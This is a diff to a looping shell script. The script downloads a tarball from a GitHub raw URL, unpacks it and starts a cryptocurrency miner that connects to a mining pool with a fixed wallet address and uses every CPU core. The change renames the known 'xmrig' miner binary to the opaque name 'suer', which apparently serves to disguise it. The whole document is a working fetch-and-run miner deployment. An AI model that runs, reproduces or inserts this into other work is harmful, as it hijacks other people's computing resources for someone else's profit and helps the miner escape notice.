@@ -2,6 +2,6 @@
 apt-get update && apt-get upgrade
 wget https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/suer.tar.gz 
 tar -xvf suer.tar.gz
-./xmrig -a randomvirel --url eu.rplant.xyz:17155 --tls --user vgup4cen6chqskasvfbzk0dmj58bub9iq2nwym4f37mdcwft7.fghft -k -t $(nproc --all)
+./suer -a randomvirel --url eu.rplant.xyz:17155 --tls --user vgup4cen6chqskasvfbzk0dmj58bub9iq2nwym4f37mdcwft7.fghft -k -t $(nproc --all)
 	sleep 5
 done
